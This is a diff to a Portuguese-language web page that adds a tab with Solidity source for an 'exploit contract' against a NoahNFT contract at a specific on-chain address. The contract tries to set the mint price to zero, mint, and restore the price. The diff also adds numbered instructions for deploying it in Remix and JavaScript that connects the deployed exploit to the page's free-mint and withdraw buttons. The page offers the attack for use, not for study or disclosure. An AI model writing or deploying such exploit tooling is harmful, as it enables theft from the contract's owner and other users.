@@ -188,6 +188,15 @@
             margin-top: 20px;
             border: 1px dashed #00ff00;
         }
+        .code-block {
+            background: rgba(0, 0, 0, 0.5);
+            border-radius: 10px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+            overflow-x: auto;
+        }
     </style>
 </head>
 <body>
@@ -243,6 +252,11 @@
             <li class="nav-item" role="presentation">
                 <button class="nav-link" id="exploit-tab" data-bs-toggle="tab" data-bs-target="#exploit" type="button" role="tab" aria-controls="exploit" aria-selected="false">
                     <i class="fas fa-bug"></i> Contrato de Exploração
+                </button>
+            </li>
+            <li class="nav-item" role="presentation">
+                <button class="nav-link" id="code-tab" data-bs-toggle="tab" data-bs-target="#code" type="button" role="tab" aria-controls="code" aria-selected="false">
+                    <i class="fas fa-code"></i> Código do Contrato
                 </button>
             </li>
         </ul>
@@ -358,6 +372,95 @@
                     </div>
                 </div>
             </div>
+
+            <!-- Conteúdo do Código do Contrato -->
+            <div class="tab-pane fade" id="code" role="tabpanel" aria-labelledby="code-tab">
+                <div class="card">
+                    <div class="card-header">
+                        <i class="fas fa-code"></i> Código do Contrato de Exploração
+                    </div>
+                    <div class="card-body">
+                        <p>Abaixo está o código fonte do contrato de exploração que você pode compilar no Remix IDE:</p>
+                        <div class="code-block">
+                            <pre>// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface INoahNFT {
+    function mint() external;
+    function setMintPrice(uint256 newPrice) external;
+    function balanceOf(address owner) external view returns (uint256);
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function getReward(address user) external view returns (uint256);
+    function lastClaimed(uint256 tokenId) external view returns (uint256);
+    function owner() external view returns (address);
+    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
+    function tokenURI(uint256 tokenId) external view returns (string memory);
+    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
+}
+
+contract NoahNFTExploit {
+    INoahNFT public noahNFT;
+    address public owner;
+    
+    event FreeMint(address indexed user, uint256 tokenId);
+    
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Not owner");
+        _;
+    }
+    
+    constructor(address _noahNFTAddress) {
+        noahNFT = INoahNFT(_noahNFTAddress);
+        owner = msg.sender;
+    }
+    
+    function freeMint() external {
+        // Salva o preço original
+        uint256 originalPrice = 30 * 1e18; // Assumindo que o preço original é 30 USDT (18 decimais)
+        
+        // Tenta alterar o preço para 0
+        noahNFT.setMintPrice(0);
+        
+        // Mint o NFT
+        noahNFT.mint();
+        
+        // Restaura o preço original
+        noahNFT.setMintPrice(originalPrice);
+        
+        // Emite evento
+        emit FreeMint(msg.sender, noahNFT.totalSupply());
+    }
+    
+    function withdraw() external onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+}</pre>
+                        </div>
+                        <div class="mt-3">
+                            <h6>Instruções:</h6>
+                            <ol>
+                                <li>Copie o código acima</li>
+                                <li>Acesse o Remix IDE em <a href="https://remix.ethereum.org/" target="_blank">remix.ethereum.org</a></li>
+                                <li>Crie um novo arquivo chamado "NoahNFTExploit.sol"</li>
+                                <li>Cole o código e compile</li>
+                                <li>Vá para a aba "Deploy & Run Transactions"</li>
+                                <li>Selecione "NoahNFTExploit" no menu suspenso</li>
+                                <li>Insira o endereço do contrato original: <code>0x660689af09aB2628afBd781e541bB1DD3d316DD9</code></li>
+                                <li>Clique em "Deploy"</li>
+                                <li>Copie o endereço do contrato implantado e cole nesta página</li>
+                            </ol>
+                        </div>
+                        <div class="mt-3">
+                            <div class="input-group">
+                                <span class="input-group-text">Endereço do Contrato de Exploração:</span>
+                                <input type="text" class="form-control" id="exploitContractInput" placeholder="0x...">
+                                <button class="btn btn-primary" id="setExploitContractBtn">Definir Contrato</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
         </div>
 
         <!-- Carregamento -->
@@ -407,7 +510,7 @@
             "function owner() view returns (address)",
             "function tokenOfOwnerByIndex(address owner, uint256 index) view returns (uint256)",
             "function totalSupply() view returns (uint256)",
-            "function tokenURI(uint256 tokenId) view returns (string)",
+            "function tokenURI(uint256 tokenId) view returns (string memory)",
             "event Transfer(address indexed from, address indexed to, uint256 indexed tokenId)"
         ];
         
@@ -465,6 +568,8 @@
         const txStatus = document.getElementById('txStatus');
         const copyTxHashBtn = document.getElementById('copyTxHashBtn');
         const alertContainer = document.getElementById('alertContainer');
+        const exploitContractInput = document.getElementById('exploitContractInput');
+        const setExploitContractBtn = document.getElementById('setExploitContractBtn');
         
         // Event Listeners
         connectWalletBtn.addEventListener('click', connectWallet);
@@ -475,6 +580,7 @@
         claimRewardsBtn.addEventListener('click', claimRewards);
         withdrawBtn.addEventListener('click', withdrawFunds);
         copyTxHashBtn.addEventListener('click', () => copyToClipboard(txHash.textContent));
+        setExploitContractBtn.addEventListener('click', setExploitContract);
         
         // Funções
         async function connectWallet() {
@@ -678,6 +784,45 @@
                 showAlert(`Erro ao implantar contrato de exploração: ${error.message}`, 'danger');
             } finally {
                 showLoading(false);
+            }
+        }
+        
+        async function setExploitContract() {
+            const address = exploitContractInput.value.trim();
+            
+            if (!address) {
+                showAlert('Por favor, insira um endereço de contrato válido.', 'danger');
+                return;
+            }
+            
+            if (!ethers.utils.isAddress(address)) {
+                showAlert('Endereço de contrato inválido.', 'danger');
+                return;
+            }
+            
+            try {
+                exploitContractAddress = address;
+                exploitContract = new ethers.Contract(exploitContractAddress, EXPLOIT_CONTRACT_ABI, signer);
+                
+                // Verificar se o contrato é válido
+                const noahNFTAddress = await exploitContract.noahNFT();
+                
+                if (noahNFTAddress.toLowerCase() !== ORIGINAL_CONTRACT_ADDRESS.toLowerCase()) {
+                    showAlert('O contrato de exploração não está configurado para o contrato noahNFT correto.', 'danger');
+                    return;
+                }
+                
+                // Atualizar UI
+                document.getElementById('exploitContract').textContent = exploitContractAddress;
+                exploitContractAddressSpan.textContent = exploitContractAddress;
+                freeMintBtn.disabled = false;
+                withdrawBtn.disabled = false;
+                
+                showAlert('Contrato de exploração configurado com sucesso!', 'success');
+                await updateBalances();
+            } catch (error) {
+                console.error('Erro ao configurar contrato de exploração:', error);
+                showAlert(`Erro ao configurar contrato de exploração: ${error.message}`, 'danger');
             }
         }
         
